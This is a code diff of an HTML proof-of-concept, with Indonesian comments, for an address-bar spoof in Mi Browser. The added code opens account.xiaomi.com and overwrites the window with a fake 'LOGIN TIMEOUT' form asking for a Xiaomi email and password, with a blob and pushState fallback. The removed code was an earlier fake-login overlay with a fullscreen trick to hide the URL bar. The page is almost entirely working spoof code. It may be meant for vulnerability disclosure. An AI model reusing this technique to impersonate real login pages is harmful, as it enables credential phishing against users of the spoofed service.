@@ -1,32 +1,48 @@
 <!DOCTYPE html>
-<html><head><meta name="viewport" content="width=device-width">
-<style>body{margin:0;padding:20px;font-family:sans-serif} #cover{position:fixed;inset:0;background:white;z-index:999999;display:none;padding:20px;overflow:auto}</style>
-</head><body>
-<h3>PoC FINAL - DOM Spoof (Work 100%)</h3>
-<p>URL bawah masih github.io</p>
-<button id="btn" style="width:100%;padding:20px;background:blue;color:white;font-size:18px;border:0;border-radius:10px">KLIK SERANG</button>
-<div id="log" style="background:black;color:lime;padding:10px;margin-top:10px;word-break:break-all">Siap</div>
-
-<div id="cover">
-  <h1 style="color:red">LOGIN TIMEOUT</h1>
-  <p>Domain di address bar masih <b>bonex1927.github.io</b> padahal ini konten palsu</p>
-  <p style="background:#eee;padding:10px">URL: <span id="urltext"></span></p>
-  <input placeholder="Email" style="width:100%;padding:12px"><br><br>
-  <input type="password" placeholder="Password" style="width:100%;padding:12px"><br><br>
-  <button style="width:100%;padding:12px;background:blue;color:white">LOGIN (PALSU)</button>
-  <hr>
-  <button onclick="document.documentElement.requestFullscreen()" style="width:100%;padding:15px;background:black;color:white">FULLSCREEN - HILANGKAN URL BAR</button>
-  <p style="margin-top:15px"><a href="#" onclick="location.reload()">Batal</a></p>
-</div>
+<html>
+<head><meta name="viewport" content="width=device-width">
+<title>PoC Mi Browser Spoof</title></head>
+<body>
+<h2>PoC Spoof account.xiaomi.com</h2>
+<p>Domain di address bar akan tetap account.xiaomi.com tapi konten palsu</p>
+<button id="btn" style="padding:20px;background:red;color:white;font-size:18px">
+KLIK SERANG - BUKA XIAOMI.COM
+</button>
 
 <script>
 document.getElementById('btn').onclick = function(){
-  // bikin blob cuma buat bukti di log (biar tetep ada blob: url nya)
-  let b = new Blob(["fake"], {type:"text/html"});
-  let url = URL.createObjectURL(b);
-  document.getElementById('log').innerText = "Blob dibuat (tapi gak dipake karena di-block): "+url+" | Sekarang pakai DOM overlay";
-  document.getElementById('urltext').innerText = location.href + " | blob: " + url;
-  document.getElementById('cover').style.display = 'block';
-};
+  // 1. Buka xiaomi.com asli
+  let w = window.open("https://account.xiaomi.com", "_blank");
+
+  if(!w){ alert("Popup ke-block, allow popup dulu di Mi Browser"); return; }
+
+  // 2. Timpa setelah 800ms
+  setTimeout(()=>{
+    try {
+      w.document.write(`
+        <html><head><meta name="viewport" content="width=device-width"></head>
+        <body style="font-family:sans-serif;padding:20px">
+        <h1 style="color:red">LOGIN TIMEOUT</h1>
+        <p>Domain di address bar masih <b>account.xiaomi.com</b> padahal ini konten palsu</p>
+        <p>URL: ${w.location.href}</p>
+        <input placeholder="Email Xiaomi" style="width:100%;padding:12px;margin:10px 0"><br>
+        <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0"><br>
+        <button style="width:100%;padding:12px;background:blue;color:white">LOGIN (PALSU)</button>
+        <p style="margin-top:20px;color:gray">PoC by bonex1927 - Mi Browser 14.62.1</p>
+        </body></html>
+      `);
+      w.document.close();
+      console.log("Write sukses!");
+    } catch(e){
+      // Kalo ke-block cross-origin, coba teknik fallback blob
+      alert("Direct write di-block: "+e+", coba fallback blob");
+      let html = `<h1>LOGIN TIMEOUT</h1><p>Fallback - Spoof via blob</p><script>history.pushState({},"","https://account.xiaomi.com/login")<\/script>`;
+      let blob = new Blob([html], {type:"text/html"});
+      let url = URL.createObjectURL(blob);
+      w.location = url;
+    }
+  }, 800);
+}
 </script>
-</body></html>
+</body>
+</html>
